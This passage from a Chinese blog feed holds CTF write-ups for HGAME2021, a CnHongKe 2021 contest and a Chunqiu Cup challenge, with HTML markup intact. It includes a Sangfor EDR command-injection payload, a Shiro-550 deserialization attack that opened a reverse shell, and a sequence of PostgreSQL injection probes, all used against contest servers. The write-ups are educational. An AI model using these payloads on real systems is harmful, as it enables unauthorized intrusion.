operator">+</span> <span class="token string">"/api/verify"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>upans<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        run<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"/api/getFlag"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">#print(session.cookies)</span></code></pre><p>一 键 获 取 flag</p><img src="/article/hgame2021/image-20210206163540205.png" class="" title="image-20210206163540205" loading="lazy"><hr><h3 id="走私者的愤怒"><a href="#走私者的愤怒" class="headerlink" title="走私者的愤怒"></a>走私者的愤怒</h3><p>题目描述：</p><p> <strong>本题为宝藏走私者的更改版本，考点相同，请先做出宝藏走私者</strong><br>Liki 日记：<br>2020年2月2日：<br>今天警局寄来一封信，是走私者 Switch 寄来的，信里只有一句话<br><strong>“我最讨厌顺风车，我将带来我的愤怒”</strong><br>真是让人摸不着头脑……<br>我看不懂，但我大受震撼。 </p><p>题目描述： <a href="http://police.liki.link/">http://police.liki.link</a> </p><p>原因是web3能上车了2333</p><p>相同payload，改改host就行</p><img src="/article/hgame2021/QQ%E5%9B%BE%E7%89%8720210206163759.png" class="" title="QQ图片20210206163759" loading="lazy"><hr><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><p>misc随缘做做了，一周三场比赛有点忙</p><hr><h3 id="Base全家福"><a href="#Base全家福" class="headerlink" title="Base全家福"></a>Base全家福</h3><p>题目描述：</p><p>新年即将来临之际，Base家族也团聚了，他们用他们特有的打招呼方式向你问了个好，你知道他们在说什么吗？ R1k0RE1OWldHRTNFSU5SVkc1QkRLTlpXR1VaVENOUlRHTVlETVJCV0dVMlVNTlpVR01ZREtSUlVIQTJET01aVUdSQ0RHTVpWSVlaVEVNWlFHTVpER01KWElRPT09PT09<br><strong>本次比赛为招新赛，请各位选手不要在当周比赛进行期间至结束后24小时内发布当周比赛题目的writeup</strong> </p><p>题目地址：<a href="https://www.baidu.com/">https://www.baidu.com</a> 很强啊</p><p>base64+base32+base16 不解释</p><hr><p>吐槽下MISC2</p><p>压缩包密码知道是啥嘛？</p><img src="/article/hgame2021/1.jpg" class="" width="1" loading="lazy"><p>23333没错就是的</p><p>misc3好像是流量包，能提出来一张几M的图片，分析图片</p><hr><h3 id="Word-RE-MASTER"><a href="#Word-RE-MASTER" class="headerlink" title="Word RE:MASTER"></a>Word RE:MASTER</h3><p>题目描述： timmix不知所踪，只留下了两个word文档，作为word专家的你能帮忙找出他的去向吗？ </p><p>题目链接：<a href="https://1.oss.hgame2021.vidar.club/Word_REMASTER_e3c365a2c0edb60fbb7152279a31dafd.zip">https://1.oss.hgame2021.vidar.club/Word_REMASTER_e3c365a2c0edb60fbb7152279a31dafd.zip</a></p><p>其实我以前出过一个Word的Misc，有人记得嘛2333</p><p>两个word文档，先看属性</p><img src="/article/hgame2021/image-20210206164905132.png" class="" title="image-20210206164905132" loading="lazy"><p>估计另一个有密码，直接以压缩包形式打开</p><p>很轻易有个<code>word/password.xml</code></p><img src="/article/hgame2021/image-20210206165015840.png" class="" title="image-20210206165015840" loading="lazy"><pre class="language-none"><code class="language-none">&lt;password&gt;+++++ +++[- &gt;++++ ++++&lt; ]&gt;+++ +.&lt;++ +[-&gt;+ ++&lt;]&gt; ++.&lt;+ ++[-&gt; +++&lt;] &gt;+.&lt;+ ++[-&gt; ---&lt;] &gt;-.++ ++++. &lt;+++[ -&gt;--- &lt;]&gt;-. +++.+ .++++ ++++. &lt;+++[ -&gt;--- &lt;]&gt;-- ----. +.--- --..+ .++++ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----- .&lt;&lt;&#x2F;password&gt;</code></pre><p>很显然brainfuck</p><p>解密网站<a href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a></p><p>解得<code>DOYOUKNOWHIDDEN?</code></p><p>开第二个文档，分析了一下什么都没有，文档只有一张图片</p><img src="/article/hgame2021/image-20210206165425076.png" class="" title="image-20210206165425076" loading="lazy"><p>选中文档发现不对劲，显示隐藏标记发现有隐藏字符，把字符取消隐藏</p><img src="/article/hgame2021/image-20210206170404252.png" class="" title="image-20210206170404252" loading="lazy"><p>发现是空白的，单独保存下来</p><img src="/article/hgame2021/image-20210206170505833.png" class="" title="image-20210206170505833" loading="lazy"><p>结合图片跟雪有关，可能是snow加密，去跑一下试试</p><img src="/article/hgame2021/image-20210206170631851.png" class="" title="image-20210206170631851" loading="lazy"><p>确实</p><hr><p>其他题目可以等官方或者PWN师傅的WP啦，每次做题不管简单还是困难都要有所收获，week2师傅们也要加油！提前祝师傅们新年快乐！</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;HAME2021-week 个人WP&lt;/p&gt;
&lt;p&gt;昵称：Err0r&lt;/p&gt;</summary>
    
    
    
    <category term="Write-Up" scheme="https://err0r.top/categories/Write-Up/"/>
    
    
    <category term="PHP" scheme="https://err0r.top/tags/PHP/"/>
    
    <category term="Python" scheme="https://err0r.top/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>CnHongKe2021公测赛</title>
    <link href="https://err0r.top/article/2021gongcesai/"/>
    <id>https://err0r.top/article/2021gongcesai/</id>
    <published>2021-02-05T05:31:14.000Z</published>
    <updated>2021-03-30T11:47:47.552Z</updated>
    
    <content type="html"><![CDATA[<p>2月5日</p><p>比赛情况：</p><img src="/article/2021gongcesai/image-20210205133228513.png" class="" title="rank" loading="lazy"><p>小比赛</p><a id="more"></a><img src="/article/2021gongcesai/image-20210205133840182.png" class="" title="rank" loading="lazy"><p>主办方平台关太快了2333，睡了一觉起来连平台都没了</p><h2 id="Sign"><a href="#Sign" class="headerlink" title="Sign"></a>Sign</h2><h3 id="Choice"><a href="#Choice" class="headerlink" title="Choice"></a>Choice</h3><p>PHP CGI解析漏洞出现的原因是（ ）</p><ul><li><p>A.cgi.fix_pathi配置错误</p></li><li><p>B.cgi.fix_pathinfo配置错误</p></li><li><p>C.phpinfo配置错误</p></li><li><p>D.cgi.fix__status_en配置错误</p></li></ul><p>很显然是<code>cgi.fix_pathinfo</code>配置错误，当设置了cgi.fix_pathinfo = 1时，PHP就会以’/‘为分割符从最后一个文件开始向前找存在的文件去执行，例如<code>/upload/a.jpg/b.php</code>.</p><hr><h3 id="扭转乾坤"><a href="#扭转乾坤" class="headerlink" title="扭转乾坤"></a>扭转乾坤</h3><p>扫码得flag</p><img src="/article/2021gongcesai/image-20210205172001695.png" class="" title="image-20210205172001695" loading="lazy"><hr><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="EDR"><a href="#EDR" class="headerlink" title="EDR"></a>EDR</h3><p>深信服载入史册</p><p>直接payload打</p><img src="/article/2021gongcesai/image-20210205134031474.png" class="" title="image-20210205134031474" loading="lazy"><p>Payload:</p><pre class="language-none"><code class="language-none">.&#x2F;?strip_slashes&#x3D;system&amp;host&#x3D;cat &#x2F;flag</code></pre><p>这题去年有过，是作为线下赛的题目，当时没外网，只能硬审，或者…<del>记得payload</del>，毕竟太有名了…</p><hr><h3 id="shiro"><a href="#shiro" class="headerlink" title="shiro"></a>shiro</h3><p>Shiro remeberMe反序列化漏洞（Shiro-550）</p><p>用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞</p><img src="/article/2021gongcesai/image-20210205135031033.png" class="" title="image-20210205135031033" loading="lazy"><p>可以如 <a href="https://www.cnblogs.com/sup3rman/archive/2020/07/16/13322898.html">参考文章</a> 所示，利用<code>shiro.py</code>生成payload</p><img src="/article/2021gongcesai/image-20210205135241419.png" class="" title="image-20210205135241419" loading="lazy"><p>当然后来才发现更简单的，直接用 <code>ShiroScan</code> 工具，可以用DNSlog的方式，也可以反弹shell，这里直接反弹shell</p><img src="/article/2021gongcesai/image-20210205135442119.png" class="" title="image-20210205135442119" loading="lazy"><p>成功弹到shell</p><img src="/article/2021gongcesai/image-20210205135511988.png" class="" title="image-20210205135511988" loading="lazy"><hr><h3 id="fast-x-3"><a href="#fast-x-3" class="headerlink" title="fast x 3"></a>fast x 3</h3><p>老脚本大师了</p><img src="/article/2021gongcesai/image-20210205135615967.png" class="" title="image-20210205135615967" loading="lazy"><p>写个py脚本即可，直接上payload，蹩脚编程，师傅们见谅…</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: UTF-8 -*-</span><span class="token triple-quoted-string string">"""@Time ： 2021/2/5 9:22@Auth ： gyy@Blog ：http://err0r.top"""</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> collectionsurl <span class="token operator">=</span> <span class="token string">"http://180.109.90.207:23891/"</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"submit"</span><span class="token punctuation">:</span> <span class="token string">"提交"</span><span class="token punctuation">&#125;</span>responses <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>responses<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"1--------------------------------取字符串"</span><span class="token punctuation">)</span>cal <span class="token operator">=</span> responses<span class="token punctuation">.</span>text<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\r"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'&lt;b>'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'&lt;/b>'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;divid=\"math\">"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/div>"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span>cal<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"2--------------------------------计数"</span><span class="token punctuation">)</span><span class="token builtin">str</span> <span class="token operator">=</span> collections<span class="token punctuation">.</span>Counter<span class="token punctuation">(</span>cal<span class="token punctuation">)</span>str1 <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"3--------------------------------排序"</span><span class="token punctuation">)</span><span class="token keyword">from</span> collections <span class="token keyword">import</span> OrderedDictstr2 <span class="token operator">=</span> OrderedDict<span class="token punctuation">(</span><span class="token builtin">sorted</span><span class="token punctuation">(</span>str1<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token operator">=</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span>x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"4--------------------------------取key"</span><span class="token punctuation">)</span>val <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> str2<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    val <span class="token operator">+=</span> ival <span class="token operator">=</span> val<span class="token keyword">print</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"5--------------------------------赋data"</span><span class="token punctuation">)</span>data<span class="token punctuation">[</span><span class="token string">'res'</span><span class="token punctuation">]</span> <span class="token operator">=</span> val<span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"6--------------------------------提交"</span><span class="token punctuation">)</span>post_responses <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>post_responses<span class="token punctuation">)</span></code></pre><p>编编改改凑合用</p><img src="/article/2021gongcesai/image-20210205140020576.png" class="" title="image-20210205140020576" loading="lazy"><hr><h2 id="Apk"><a href="#Apk" class="headerlink" title="Apk"></a>Apk</h2><h3 id="Des"><a href="#Des" class="headerlink" title="Des"></a>Des</h3><p>2015ISCC的题目改题<code>没有题目的题目</code></p><p>主要代码</p><pre class="language-none"><code class="language-none">public boolean check() &#123;     byte[] b2 &#x3D; &#123;103, 112, 111, 49, 61, 113, 117, 109, 76, 108, 77, 57, 59, 90, 64, 105, 33, 89, 74, 113, 92, 84, 87, 113, 105, 65, 35, 74, 93, 73, 43, 120&#125;;     byte[] b3 &#x3D; this.result1.getBytes();     for (int j &#x3D; 0; j &lt; b3.length; j++) &#123;         Log.d(&quot;test&quot;, ((byte) (b3[j] ^ j)));     &#125;     if (b3.length !&#x3D; b2.length) &#123;         return false;     &#125;     for (int j2 &#x3D; 0; j2 &lt; b2.length; j2++) &#123;         if ((b3[j2] ^ b2[j2]) !&#x3D; j2) &#123;             return false;         &#125;     &#125;     return true; &#125;</code></pre><p>exp:</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> pyDes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> base64V0 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">,</span> <span class="token number">109</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">93</span><span class="token punctuation">,</span> <span class="token number">73</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">DeCheck</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    v1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        v1<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span>    xx <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>v1<span class="token punctuation">)</span>    <span class="token comment">##print xx</span>    <span class="token keyword">return</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>xx<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    key <span class="token operator">=</span> <span class="token string">'ilovedes'</span>    iv <span class="token operator">=</span> <span class="token string">'\x01\x02\x03\x04\x05\x06\x07\x08'</span>    k <span class="token operator">=</span> des<span class="token punctuation">(</span>key<span class="token punctuation">,</span> CBC<span class="token punctuation">,</span> iv<span class="token punctuation">,</span> pad<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> padmode<span class="token operator">=</span>PAD_PKCS5<span class="token punctuation">)</span>    flag <span class="token operator">=</span> k<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>DeCheck<span class="token punctuation">(</span>V0<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"Your flag is: "</span> <span class="token operator">+</span> flag</code></pre><img src="/article/2021gongcesai/image-20210205140432528.png" class="" title="image-20210205140432528" loading="lazy"><img src="/article/2021gongcesai/QQ%E5%9B%BE%E7%89%8720210205171005.jpg" class="" title="QQ图片20210205171005" loading="lazy"><p>参考链接：<a href="http://bobao.360.cn/ctf/learning/136.html">http://bobao.360.cn/ctf/learning/136.html</a></p><hr><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="DTMF"><a href="#DTMF" class="headerlink" title="DTMF"></a>DTMF</h3><p>电话音，网上有在线识别网站</p><p><a href="http://dialabc.com/sound/detect/index.html">http://dialabc.com/sound/detect/index.html</a></p><p>格式要求<code>.wav</code>，先用ffmpeg转格式</p><img src="/article/2021gongcesai/image-20210205140704301.png" class="" title="image-20210205140704301" loading="lazy"><p>再放上去识别</p><img src="/article/2021gongcesai/image-20210205140736060.png" class="" title="image-20210205140736060" loading="lazy"><pre class="language-none"><code class="language-none">CnHongKe&#123;A18D3B18C*231#&#125;</code></pre><hr><h3 id="HalfQR"><a href="#HalfQR" class="headerlink" title="HalfQR"></a>HalfQR</h3><p>二维码修复网站 <a href="https://merricx.github.io/qrazybox/">https://merricx.github.io/qrazybox/</a></p><img src="/article/2021gongcesai/qr1.jpg" class="" title="QR" loading="lazy"><p>手 撸</p><img src="/article/2021gongcesai/image-20210205165950957.png" class="" title="image-20210205165950957" loading="lazy"><img src="/article/2021gongcesai/image-20210205170018477.png" class="" title="image-20210205170018477" loading="lazy"><p>然后</p><img src="/article/2021gongcesai/image-20210205165843064.png" class="" title="image-20210205165843064" loading="lazy"><p>最后</p><pre class="language-none"><code class="language-none">CnHongKe&#123;f88ae38f450e76d3c92410e3650df67&#125;</code></pre><p>也可以手算…毕竟数据域的半边东西给了</p><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这些题目作为线下赛题目是难了，毕竟去年有过一次线下，线上赛就不说了，神仙乱斗2333，还不用交WP，希望主办方能完善赛制，首先赛后都不用交WP是挺离谱的，其次题目的质量…其实还行，但作为线上还是简单了，一篇wp却写不出多少东西，通篇八题仅仅一千字，可能是题目问题，也有一部分我的问题，总之多多总结吧。</p><img src="/article/2021gongcesai/QQ%E5%9B%BE%E7%89%8720210205185049.jpg" class="" width="233" loading="lazy"><p>懂的都懂2333</p><p>还是有些收获的，提前祝大家新年快乐！</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;2月5日&lt;/p&gt;
&lt;p&gt;比赛情况：&lt;/p&gt;
&lt;img src=&quot;/article/2021gongcesai/image-20210205133228513.png&quot; class=&quot;&quot; title=&quot;rank&quot;&gt;

&lt;p&gt;小比赛&lt;/p&gt;</summary>
    
    
    
    <category term="Write-Up" scheme="https://err0r.top/categories/Write-Up/"/>
    
    
    <category term="PHP" scheme="https://err0r.top/tags/PHP/"/>
    
    <category term="Python" scheme="https://err0r.top/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>春秋杯2021新春欢乐赛一道题——按F注入 对pgsql的研究</title>
    <link href="https://err0r.top/article/cqb2021/"/>
    <id>https://err0r.top/article/cqb2021/</id>
    <published>2021-02-01T10:45:42.000Z</published>
    <updated>2021-03-30T11:49:26.770Z</updated>
    
    <content type="html"><![CDATA[<p>只做了一道题，按F注入，研究了pgsql，算个小笔记，不能算研究性文章</p><a id="more"></a><h2 id="按F注入"><a href="#按F注入" class="headerlink" title="按F注入"></a>按F注入</h2><p>打开题目看到只能手机访问，看到了源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span>body<span class="token operator">></span>只有手机才能访问<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token keyword">function</span> <span class="token function">is_mobile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token variable">$clientkeywords</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token single-quoted-string string">'nokia'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'sony'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'ericsson'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'mot'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'samsung'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'htc'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'sgh'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'lg'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'sharp'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'sie-'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'philips'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'panasonic'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'alcatel'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'lenovo'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'iphone'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'ipod'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'blackberry'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'meizu'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'android'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'netfront'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'symbian'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'ucweb'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'windowsce'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'palm'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'operamini'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'operamobi'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'openwave'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'nexusone'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'cldc'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'midp'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'wap'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'mobile'</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token comment">//从HTTP_USER_AGENT中查找手机浏览器的关键字--></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/("</span> <span class="token punctuation">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$clientkeywords</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">")/i"</span><span class="token punctuation">,</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token punctuation">&#125;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token punctuation">&#125;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token punctuation">&#125;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span></code></pre><p>于是在HEADER里添加<code>User-Agent: mobile</code>即可</p><img src="/article/cqb2021/image-20210201185004667.png" class="" title="UA" loading="lazy"><p>点击任何都是JavaScript脚本<code>javascript:alert(&#39;投票成功,恭喜您获得奶奶一个&#39;)</code>，底部发现了提示</p><p><code>&lt;!--&lt;a href=&quot;?f=1&quot;&gt;我选择按下F进入TK&lt;/a&gt;--&gt;</code></p><p>于是访问<code>./?f=1</code>没有变化，猜测SSRF或SQL注入，但是没有其他提示。</p><p>访问<code>./?f=1&#39;</code>发现有弹窗</p><img src="/article/cqb2021/image-20210201185510275.png" class="" title="小哥哥" loading="lazy"><p>fuzz一波，发现<code>#</code>和<code>%23</code>都会一直弹窗，而使用<code>--</code>注释即<code>?f=1&#39; --</code>却不会弹窗，搜索一波发现是 PostgreSQL ，猜测<strong>语法错误</strong>或者<strong>报错</strong>会有弹窗</p><p>甚至搜到了原题，赛后向 <a href="https://ha1c9on.top/">@HA1C9ON</a> 大佬请教得知，当时比赛的WP是有错误的，后续会道来。</p><p>测试一下发现<code>./?f=</code></p><blockquote><ul><li><code>gyy</code>，没有警告</li><li><code>gyy&#39;</code>，警告</li><li><code>gyy&#39; and 1=0 --</code>，没有警告</li><li><code>gyy&#39; and 1=1 --</code>，没有警告</li><li><code>gyy&#39; order by 1 --</code>，没有警告</li><li><code>gyy&#39; order by 2 --</code>，没有警告</li><li><code>gyy&#39; order by 3 --</code>， 警告</li><li><code>gyy&#39; union select 1,2 --</code>， 警告</li><li><code>gyy&#39; union select 1,&#39;2&#39; --</code>，没有警告</li><li><code>gyy&#39; union select 1,pg_sleep(10) --</code>， 警告</li><li><code>gyy&#39; union select 1,cast(pg_sleep(10) as text) --</code>，没有警告（有延迟！）</li><li><code>gyy&#39; union select 1,&#39;2&#39; from pg_database --</code>，没有警告</li><li><code>gyy&#39; union select 1,&#39;2&#39; from gyy --</code>， 警告</li><li><code>gyy&#39; union select 1,chr(65) --</code>，没有警告</li><li><code>gyy&#39; union select 1,chr(-65) --</code>，没有警告</li></ul></blockquote><p>由order by可以判断此处列数为2，由union select可以判断1处对应列为数值类型，2处对应非数值类型</p><h3 